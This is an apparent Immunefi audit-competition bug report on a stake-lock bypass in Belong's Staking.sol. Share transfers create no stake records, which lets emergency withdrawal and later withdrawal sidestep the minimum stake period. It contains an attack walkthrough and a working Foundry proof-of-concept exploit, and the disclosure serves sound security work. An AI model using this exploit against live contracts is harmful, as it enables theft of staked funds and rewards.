# 57932 sc critical attacker can bypass stake lock

**Submitted on Oct 29th 2025 at 14:06:41 UTC by @danial for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57932
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Protocol insolvency

## Description

### Brief/Intro

An attacker can remove their assets while keeping large locked stakes untouched, effectively bypassing the minimum stake period and unlocking funds early. This can break internal accounting and cause protocol insolvency.

### Vulnerability Details

Each deposit creates a new locked stake record:

```solidity
stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
```

Withdrawal uses `_consumeUnlockedSharesOrRevert()` to ensure `minStakePeriod` has passed. However, in `emergencyWithdraw()`, the contract calls:

```solidity
_removeAnySharesFor(_owner, shares);
_burn(_owner, shares);
```

The function `_removeAnySharesFor` removes stake records:

```solidity
function _removeAnySharesFor(address staker, uint256 shares) internal {
        Stake[] storage userStakes = stakes[staker];
        uint256 remaining = shares;

        for (uint256 i; i < userStakes.length && remaining > 0;) {
            uint256 stakeShares = userStakes[i].shares;
            if (stakeShares <= remaining) {
                remaining -= stakeShares;
                userStakes[i] = userStakes[userStakes.length - 1];
                userStakes.pop();
                // don't ++i: a new element is now at index i
            } else {
                userStakes[i].shares = stakeShares - remaining;
                remaining = 0;
                unchecked {
                    ++i;
                }
            }
        }
    }
```

The issue arises when the attacker holds multiple stakes and relies on transfers not creating stake entries. The sequence below demonstrates how an attacker can bypass the lock while keeping stake records intact.

{% stepper %}
{% step %}

### Attacker setup & initial deposits

* Wallet A deposits 100e18 → stakes\[A] = {100, tA}.
* Wallet B deposits 2e18 → stakes\[B] = {2, tB}.
  {% endstep %}

{% step %}

### Transfer shares without creating stake record

* Attacker transfers 100e18 shares from A → B (transfer does not create a stake entry).
* State: stakes\[A] still {100, tA}; stakes\[B] has {2, tB} and balance includes transferred 100 shares.
  {% endstep %}

{% step %}

### Emergency withdraw consumes transferred shares

* B calls `emergencyWithdraw(102e18, to=B, owner=B)`
* `_removeAnySharesFor` removes {2,tB} and consumes transferred shares, paying \~90% (\~92e18) to B. stakes\[A] entry remains.
* Attacker now holds \~92e18 tokens and can use these tokens near expiry while having the stake records.
  {% endstep %}

{% step %}

### Reuse stake records to withdraw locked stake + rewards later

* Near original lock expiry, Wallet C deposits 100e18 → stakes\[C] = {100, tC}.
* Attacker transfers those 100 shares from C → A (transfer creates no stake entry).
* Now A’s balance includes 100 shares, while stakes\[A] still records the old {100, tA}.
* Attacker withdraws from A after lock period and redeems 100e18 + rewards.
  {% endstep %}

{% step %}

### Result

* Attacker extracts rewards while not actually locking the assets during the lock time, gaining staking benefits unfairly and breaking intended stake logic.
  {% endstep %}
  {% endstepper %}

### Impact Details

Attacker can transfer shares to get most of their tokens with minimal penalty while keeping stake records intact, then later get rewards without respecting the lock. This undermines the contract’s intended staking behavior and can lead to protocol insolvency.

### Mitigation

Suggested mitigation (disable transfers of shares):

```solidity
// add to Staking.sol
function _transfer(address from, address to, uint256 amount) internal virtual override {
    revert("transfers disabled");
}
```

## Proof of Concept

Note: for simplicity, this PoC is not using a proxy (the constructor in Staking.sol can be commented out for testing).

Run the test with: forge test -vv

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {Staking} from "../src/Staking.sol";

contract ERC20Mock {
    string public name = "MockLONG";
    string public symbol = "mLONG";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 amt);
    event Approval(address indexed owner, address indexed spender, uint256 amt);

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        emit Transfer(address(0), to, amt);
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        emit Approval(msg.sender, spender, amt);
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insuff");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        emit Transfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "from insuff");
        uint256 al = allowance[from][msg.sender];
        require(al >= amt, "allow insuff");
        allowance[from][msg.sender] = al - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        emit Transfer(from, to, amt);
        return true;
    }
}

contract pocTest is Test {
    Staking public staking;
    ERC20Mock public token;

    address stakingOwner = makeAddr("stakingOwner");
    address attacker1 = makeAddr("attacker1");
    address attacker2 = makeAddr("attacker2");
    address attacker3 = makeAddr("attacker3");

    function setUp() public {
        token = new ERC20Mock();
        staking = new Staking(); // for simplicity, we are not using proxy here (just comment the constructor in Staking.sol)
        staking.initialize(address(stakingOwner), address(stakingOwner), address(token));
        vm.startPrank(stakingOwner);
        staking.setMinStakePeriod(10 days);
        vm.stopPrank();
        token.mint(stakingOwner, 50e18);
        token.mint(attacker1, 100e18);
        token.mint(attacker2, 2e18);
        token.mint(attacker3, 100e18);
    }

    function test_poc() public{

        vm.startPrank(attacker2);
        token.approve(address(staking), 2e18);
        staking.deposit(2e18, address(attacker2));

        vm.expectRevert(bytes("MinStakePeriodNotMet()"));
        staking.withdraw(2e18, address(attacker2), address(attacker2));

        vm.stopPrank();

        vm.startPrank(attacker1);
        token.approve(address(staking), 100e18);
        staking.deposit(100e18, address(attacker1));

        vm.expectRevert(bytes("MinStakePeriodNotMet()"));
        staking.withdraw(100e18, address(attacker1), address(attacker1));

        staking.transfer(address(attacker2), 100e18);

        console.log("attacker2 shares after transfer:", staking.balanceOf(address(attacker2))/1e18);

        vm.stopPrank();

        vm.startPrank(attacker2);

        staking.emergencyWithdraw(102e18, address(attacker2), address(attacker2));

        console.log("attacker2 shares after transfer:", staking.balanceOf(address(attacker2))/1e18);

        console.log("attacker2 token balance after emergency withdraw:", token.balanceOf(address(attacker2))/1e18);

        vm.stopPrank();

        vm.warp(block.timestamp + 11 days);

        vm.startPrank(attacker3);
        token.approve(address(staking), 100e18);
        staking.deposit(100e18, address(attacker3));
        staking.transfer(address(attacker1), 100e18);
        vm.stopPrank();

        vm.startPrank(stakingOwner);
        token.approve(address(staking), 50e18);
        staking.distributeRewards(50e18);
        vm.stopPrank();

        vm.startPrank(attacker1);
        staking.withdraw(staking.maxWithdraw(attacker1), address(attacker1), address(attacker1));
        console.log("attacker1 token balance after withdraw:", token.balanceOf(address(attacker1))/1e18);
        vm.stopPrank();
    }
}
```
